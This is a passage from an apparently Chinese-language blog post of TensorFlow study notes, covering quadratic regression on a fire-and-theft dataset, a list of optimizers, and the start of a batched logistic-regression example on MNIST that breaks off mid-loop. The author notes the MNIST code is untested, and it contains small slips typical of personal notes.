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" alt=""></p>
<p>100次迭代之后，平均方差还是挺大的，拟合的不够好，所以考虑二次函数 Y = wXX + uX + b。</p>
<p>所以修改第3步和第4步。</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># Step 3: create weight and bias, initialized to 0</span>
w <span class="token operator">=</span> tf<span class="token punctuation">.</span>Variable<span class="token punctuation">(</span><span class="token number">0.0</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'weights_1'</span><span class="token punctuation">)</span>
u <span class="token operator">=</span> tf<span class="token punctuation">.</span>Variable<span class="token punctuation">(</span><span class="token number">0.0</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">"weights_2"</span><span class="token punctuation">)</span>
b <span class="token operator">=</span> tf<span class="token punctuation">.</span>Variable<span class="token punctuation">(</span><span class="token number">0.0</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'bias'</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># Step 4: build model to predict Y</span>
Y_predicted <span class="token operator">=</span> X <span class="token operator">*</span> X <span class="token operator">*</span> w <span class="token operator">+</span> X <span class="token operator">*</span> u <span class="token operator">+</span> b
</code></pre>
<p><img src="1.png" alt=""></p>
<blockquote>
<blockquote>
<p>二次函数的拟合需要改动多处代码。lecture 中并没有提出来，首先问题是 GradientDescentOptimizer 在此处并没有用，我试了一下，觉得 AdamOptimizer 是效果比较好的，当 learning_rate 是 0.001 时，最后的平均损失是 706.673181781，当 learning_rate 是 0.001 时，最后的平均损失是 596.339147409，深度学习真的和炼丹一样。</p>
</blockquote>
</blockquote>
<p>plt.scatter 也有个魔性的问题，好不容易解决了。这里附上完整代码</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># coding=utf-8</span>
<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np
<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt
<span class="token keyword">import</span> tensorflow <span class="token keyword">as</span> tf
<span class="token keyword">import</span> xlrd

DATA_FILE <span class="token operator">=</span> <span class="token string">'data/fire_theft.xls'</span>

<span class="token comment" spellcheck="true"># Step 1: read in data from the .xls file</span>
<span class="token comment" spellcheck="true"># book = xlrd.open_workbook(DATA_FILE, encoding_override="utf-8")</span>
<span class="token comment" spellcheck="true"># sheet = book.sheet_by_index(0)</span>
<span class="token comment" spellcheck="true"># data = np.asarray([sheet.row_values(i) for i in range(1, sheet.nrows)])</span>
<span class="token comment" spellcheck="true"># n_samples = sheet.nrows - 1</span>
<span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd  <span class="token comment" spellcheck="true"># 使用pandas更简便</span>
df <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_excel<span class="token punctuation">(</span>DATA_FILE<span class="token punctuation">)</span>
data <span class="token operator">=</span> df<span class="token punctuation">.</span>values
n_samples <span class="token operator">=</span> len<span class="token punctuation">(</span>df<span class="token punctuation">.</span>index<span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># Step 2: create placeholders for input X (number of fire) and label Y (number of theft)</span>
X <span class="token operator">=</span> tf<span class="token punctuation">.</span>placeholder<span class="token punctuation">(</span>tf<span class="token punctuation">.</span>float32<span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'X'</span><span class="token punctuation">)</span>
Y <span class="token operator">=</span> tf<span class="token punctuation">.</span>placeholder<span class="token punctuation">(</span>tf<span class="token punctuation">.</span>float32<span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'Y'</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># Step 3: create weight and bias, initialized to 0</span>
w <span class="token operator">=</span> tf<span class="token punctuation">.</span>Variable<span class="token punctuation">(</span><span class="token number">0.0</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'weights_1'</span><span class="token punctuation">)</span>
u <span class="token operator">=</span> tf<span class="token punctuation">.</span>Variable<span class="token punctuation">(</span><span class="token number">0.0</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">"weights_2"</span><span class="token punctuation">)</span>
b <span class="token operator">=</span> tf<span class="token punctuation">.</span>Variable<span class="token punctuation">(</span><span class="token number">0.0</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'bias'</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># Step 4: build model to predict Y</span>
Y_predicted <span class="token operator">=</span> X <span class="token operator">*</span> X <span class="token operator">*</span> w <span class="token operator">+</span> X <span class="token operator">*</span> u <span class="token operator">+</span> b

<span class="token comment" spellcheck="true"># Step 5: use the square error as the loss function</span>
loss <span class="token operator">=</span> tf<span class="token punctuation">.</span>square<span class="token punctuation">(</span>Y <span class="token operator">-</span> Y_predicted<span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'loss'</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># Step 6: using gradient descent with learning rate of 0.01 to minimize loss</span>
optimizer <span class="token operator">=</span> tf<span class="token punctuation">.</span>train<span class="token punctuation">.</span>AdamOptimizer<span class="token punctuation">(</span>learning_rate<span class="token operator">=</span><span class="token number">0.01</span><span class="token punctuation">)</span><span class="token punctuation">.</span>minimize<span class="token punctuation">(</span>loss<span class="token punctuation">)</span>

<span class="token keyword">with</span> tf<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> sess<span class="token punctuation">:</span>
    <span class="token comment" spellcheck="true"># Step 7: initialize the necessary variables, in this case, w and b</span>
    sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>tf<span class="token punctuation">.</span>global_variables_initializer<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true"># writer = tf.summary.FileWriter('./my_graph/03/linear_reg', sess.graph)</span>

    <span class="token comment" spellcheck="true"># Step 8: train the model</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># train the model 100 times</span>
        total_loss <span class="token operator">=</span> <span class="token number">0</span>
        <span class="token keyword">for</span> x<span class="token punctuation">,</span> y <span class="token keyword">in</span> data<span class="token punctuation">:</span>
            <span class="token comment" spellcheck="true"># Session runs train_op and fetch values of loss</span>
            _<span class="token punctuation">,</span> l <span class="token operator">=</span> sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">[</span>optimizer<span class="token punctuation">,</span> loss<span class="token punctuation">]</span><span class="token punctuation">,</span> feed_dict<span class="token operator">=</span><span class="token punctuation">{</span>X<span class="token punctuation">:</span> x<span class="token punctuation">,</span> Y<span class="token punctuation">:</span>y<span class="token punctuation">}</span><span class="token punctuation">)</span>
            total_loss <span class="token operator">+=</span> l

        <span class="token keyword">print</span> <span class="token string">'Epoch {0}: {1}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">,</span> total_loss<span class="token operator">/</span>n_samples<span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true"># close the writer when you're done using it</span>
    <span class="token comment" spellcheck="true"># writer.close()</span>

    <span class="token comment" spellcheck="true"># Step 9: output the values of w and b</span>
    w_value<span class="token punctuation">,</span> u_value<span class="token punctuation">,</span> b_value <span class="token operator">=</span> sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">[</span>w<span class="token punctuation">,</span> u<span class="token punctuation">,</span> b<span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># plot the results</span>
X<span class="token punctuation">,</span> Y <span class="token operator">=</span> data<span class="token punctuation">.</span>T<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> data<span class="token punctuation">.</span>T<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>X<span class="token punctuation">,</span> Y<span class="token punctuation">,</span> <span class="token string">'bo'</span><span class="token punctuation">,</span> label<span class="token operator">=</span><span class="token string">'Real data'</span><span class="token punctuation">)</span>
plt<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>X<span class="token punctuation">,</span> X <span class="token operator">*</span> X <span class="token operator">*</span> w_value <span class="token operator">+</span> X <span class="token operator">*</span> u_value <span class="token operator">+</span> b_value<span class="token punctuation">,</span> color<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">,</span>label<span class="token operator">=</span><span class="token string">'Predicted data'</span><span class="token punctuation">)</span>
plt<span class="token punctuation">.</span>legend<span class="token punctuation">(</span><span class="token punctuation">)</span>
plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<h6 id="u5206_u6790_u4EE3_u7801"><a href="#u5206_u6790_u4EE3_u7801" class="headerlink" title="分析代码"></a>分析代码</h6><p>通过上面的程序会发现，在创建完优化器后，用 ‘sess.run(optimizer, feed_dict={X: x, Y: y})’ 来运行程序。实际上 TensorFlow 将所有操作作为图的一部分来运算，同时 feed_dict 作为输入的数据，而 loss 是根据 w 和 b 计算得到的，其实 TensorFlow 会根据 loss 来自动求梯度。</p>
<h5 id="u4F18_u5316_u5668_28Optimizers_29"><a href="#u4F18_u5316_u5668_28Optimizers_29" class="headerlink" title="优化器(Optimizers)"></a>优化器(Optimizers)</h5><p>GradientDescentOptimizer 表示更新规则是按照梯度下降的。TensorFlow 可以自动求导，更新权重和偏差来计算损失值。</p>
<p>优化器默认是训练所有目标函数的可训练变量，当然可以通过设置修改变量为不可训练型。比如以下的例子：</p>
<pre class=" language-python"><code class="language-python">global_step <span class="token operator">=</span> tf<span class="token punctuation">.</span>Variable<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> trainable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> dtype<span class="token operator">=</span>tf<span class="token punctuation">.</span>int32<span class="token punctuation">)</span>
learning_rate <span class="token operator">=</span> <span class="token number">0.01</span> <span class="token operator">*</span> <span class="token number">0.99</span> <span class="token operator">**</span> tf<span class="token punctuation">.</span>cast<span class="token punctuation">(</span>global_step<span class="token punctuation">,</span> tf<span class="token punctuation">.</span>float32<span class="token punctuation">)</span>
increment_step <span class="token operator">=</span> global_step<span class="token punctuation">.</span>assign_add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
optimizer <span class="token operator">=</span> tf<span class="token punctuation">.</span>GradientDescentOptimizer<span class="token punctuation">(</span>learning_rate<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># learning rate can be a tensor</span>
</code></pre>
<p>tf.Variable 类的完整定义如下：</p>
<pre class=" language-python"><code class="language-python">tf<span class="token punctuation">.</span>Variable<span class="token punctuation">(</span>initial_value<span class="token operator">=</span>None<span class="token punctuation">,</span> trainable<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> collections<span class="token operator">=</span>None<span class="token punctuation">,</span> 
            validate_shape<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> caching_device<span class="token operator">=</span>None<span class="token punctuation">,</span> name<span class="token operator">=</span>None<span class="token punctuation">,</span>
            variable_def<span class="token operator">=</span>None<span class="token punctuation">,</span> dtype<span class="token operator">=</span>None<span class="token punctuation">,</span> expected_shape<span class="token operator">=</span>None<span class="token punctuation">,</span> 
            import_scope<span class="token operator">=</span>None<span class="token punctuation">)</span>
</code></pre>
<h6 id="Optimizer_u5217_u8868"><a href="#Optimizer_u5217_u8868" class="headerlink" title="Optimizer列表"></a>Optimizer列表</h6><p>目前常见的有:</p>
<pre><code>tf.train.GradientDescentOptimizer 
tf.train.AdadeltaOptimizer 
tf.train.AdagradOptimizer 
tf.train.AdagradDAOptimizer 
tf.train.MomentumOptimizer 
tf.train.AdamOptimizer 
tf.train.FtrlOptimizer 
tf.train.ProximalGradientDescentOptimizer 
tf.train.ProximalAdagradOptimizer 
tf.train.RMSPropOptimizer
</code></pre><p>这上面的一些可以参考CS231n中的内容。</p>
<h3 id="TensorFlow__u903B_u8F91_u56DE_u5F52"><a href="#TensorFlow__u903B_u8F91_u56DE_u5F52" class="headerlink" title="TensorFlow 逻辑回归"></a>TensorFlow 逻辑回归</h3><p>逻辑回归也是很重要的，这里使用逻辑回归来对 MNIST 分类。</p>
<p>MNIST 是著名的手写数字数据集。其中每个图片是 28 x 28 像素，被平滑成大小为784的1维张量，每个图片都有一个标签。</p>
<p>使用 TF Learn 可以简洁的读取数据集，同时使用 One-hot 编码。 One-hot 编码 是只有一位是1其他都为0的数组。</p>
<p>以下的完整代码我并没有测试 括弧哭</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> tensorflow<span class="token punctuation">.</span>examples<span class="token punctuation">.</span>tutorials<span class="token punctuation">.</span>mnist <span class="token keyword">import</span> input_data

MNIST <span class="token operator">=</span> input_data<span class="token punctuation">.</span>read_data_sets<span class="token punctuation">(</span><span class="token string">"/data/mnist"</span><span class="token punctuation">,</span> one_hot<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
</code></pre>
<p>此时 MNIST 是一个对象，存放 55000 个训练数据和 10000 个测试数据，以及 5000 个验证集。</p>
<p>因为数据很大，所以为了加速训练，可以使用批量逻辑回归。首先修改 X_placeholder 和 Y_placeholder 的维度来适应 batch_size。</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> time
<span class="token keyword">import</span> numpy  <span class="token keyword">as</span>  np
<span class="token keyword">import</span> tensorflow  <span class="token keyword">as</span>  tf
<span class="token keyword">from</span>  tensorflow<span class="token punctuation">.</span>examples<span class="token punctuation">.</span>tutorials<span class="token punctuation">.</span>mnist <span class="token keyword">import</span> input_data

<span class="token comment" spellcheck="true"># Step 1: Read in data</span>
<span class="token comment" spellcheck="true"># using TF Learn's built in function to load MNIST data to the folder data/mnist</span>
MNIST <span class="token operator">=</span> input_data<span class="token punctuation">.</span>read_data_sets<span class="token punctuation">(</span><span class="token string">"/data/mnist"</span><span class="token punctuation">,</span> one_hot<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># Step 2: Define parameters for the model</span>
learning_rate <span class="token operator">=</span> <span class="token number">0.01</span>
batch_size <span class="token operator">=</span> <span class="token number">128</span>
n_epochs <span class="token operator">=</span> <span class="token number">25</span>

<span class="token comment" spellcheck="true"># Step 3: create placeholders for features and labels</span>
<span class="token comment" spellcheck="true"># each image in the MNIST data is of shape 28*28 = 784</span>
<span class="token comment" spellcheck="true"># therefore, each image is represented with a 1x784 tensor</span>
<span class="token comment" spellcheck="true"># there are 10 classes for each image, corresponding to digits 0 - 9. # each label is one hot vector.</span>
X <span class="token operator">=</span> tf<span class="token punctuation">.</span>placeholder<span class="token punctuation">(</span>tf<span class="token punctuation">.</span>float32<span class="token punctuation">,</span> <span class="token punctuation">[</span>batch_size<span class="token punctuation">,</span> <span class="token number">784</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
Y <span class="token operator">=</span> tf<span class="token punctuation">.</span>placeholder<span class="token punctuation">(</span>tf<span class="token punctuation">.</span>float32<span class="token punctuation">,</span> <span class="token punctuation">[</span>batch_size<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># Step 4: create weights and bias</span>
<span class="token comment" spellcheck="true"># w is initialized to random variables with mean of 0, stddev of 0.01</span>
<span class="token comment" spellcheck="true"># b is initialized to 0</span>
<span class="token comment" spellcheck="true"># shape of w depends on the dimension of X and Y so that Y = tf.matmul(X, w)</span>
<span class="token comment" spellcheck="true"># shape of b depends on Y</span>
w <span class="token operator">=</span> tf<span class="token punctuation">.</span>Variable<span class="token punctuation">(</span>tf<span class="token punctuation">.</span>random_normal<span class="token punctuation">(</span>shape<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">784</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">,</span> stddev<span class="token operator">=</span><span class="token number">0.01</span><span class="token punctuation">)</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">"weights"</span><span class="token punctuation">)</span>
b <span class="token operator">=</span> tf<span class="token punctuation">.</span>Variable<span class="token punctuation">(</span>tf<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">"bias"</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># Step 5: predict Y from X and w, b</span>
<span class="token comment" spellcheck="true"># the model that returns probability distribution of possible label of the image # through the softmax layer</span>
<span class="token comment" spellcheck="true"># a batch_size x 10 tensor that represents the possibility of the digits</span>
logits <span class="token operator">=</span> tf<span class="token punctuation">.</span>matmul<span class="token punctuation">(</span>X<span class="token punctuation">,</span> w<span class="token punctuation">)</span> <span class="token operator">+</span> b

<span class="token comment" spellcheck="true"># Step 6: define loss function</span>
<span class="token comment" spellcheck="true"># use softmax cross entropy with logits as the loss function</span>
<span class="token comment" spellcheck="true"># compute mean cross entropy, softmax is applied internally</span>
entropy <span class="token operator">=</span> tf<span class="token punctuation">.</span>nn<span class="token punctuation">.</span>softmax_cross_entropy_with_logits<span class="token punctuation">(</span>logits<span class="token punctuation">,</span> Y<span class="token punctuation">)</span>
loss <span class="token operator">=</span> tf<span class="token punctuation">.</span>reduce_mean<span class="token punctuation">(</span>entropy<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># computes the mean over examples in the batch</span>

<span class="token comment" spellcheck="true"># Step 7: define training op</span>
<span class="token comment" spellcheck="true"># using gradient descent with learning rate of 0.01 to minimize cost </span>
optimizer <span class="token operator">=</span> tf<span class="token punctuation">.</span>train<span class="token punctuation">.</span>GradientDescentOptimizer<span class="token punctuation">(</span>learning_rate<span class="token operator">=</span>learning_rate<span class="token punctuation">)</span><span class="token punctuation">.</span>minimize<span class="token punctuation">(</span>loss<span class="token punctuation">)</span>
init <span class="token operator">=</span> tf<span class="token punctuation">.</span>global_variables_initializer<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">with</span>  tf<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> sess<span class="token punctuation">:</span>
    sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>init<span class="token punctuation">)</span>
    n_batches <span class="token operator">=</span> int<span class="token punctuation">(</span>MNIST<span class="token punctuation">.</span>train<span class="token punctuation">.</span>num_examples <span class="token operator">/</span> batch_size<span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>n_epochs<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true"># train the model n_epochs times</span>
        <span class="token keyword">for</span> _ <span class="token keyword">in</span> range<span class="token punctuation">(</span>n_batches<span class="token punctuation">)</span><span class="token punctuation">:</span>
            X_batch<span class="token punctuation">,</span> Y_batch <span class="token operator">=</span> MNIST<span class="token punctuation">.</span>train<span class="token punctuation">.</span>next_batch<span class="token punctuation">(</span>batch_size<span class="token punctuation">)</span>
        sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">[</span>optimizer<span class="token punctuation">,</span> loss<span class="token punctuation">]</span><span class="token punctuation">,</span> feed_dict<span class="token operator">=</span><span class="token punctuation">{</span>X<span class="token punctuation">:</span> X_batch<span class="token punctuation">,</span> Y<span class="token punctuation">:</span> Y_batch<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># average loss should be around 0.35 after 25 epochs</span>

<span class="token comment" spellcheck="true"># test the model</span>
n_batches <span class="token operator">=</span> int<span class="token punctuation">(</span>MNIST<span class="token punctuation">.</span>test<span class="token punctuation">.</span>num_examples <span class="token operator">/</span> batch_size<span class="token punctuation">)</span>
total_correct_preds <span class="token operator">=</span> <span class="token number">0</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>n_batches<span class="token punctuation">)</span><span class="token punctuation">:</span>
    X_batch<span class="token punctuation">,</span> Y_batch <span class="token operator">=</span> MNIST<span class="token punctuation">.</span>test<span class="token punctuation">.</span>next_batch<span class="token punctuation">(</span>batch_size<span class="token punctuation">)</span>
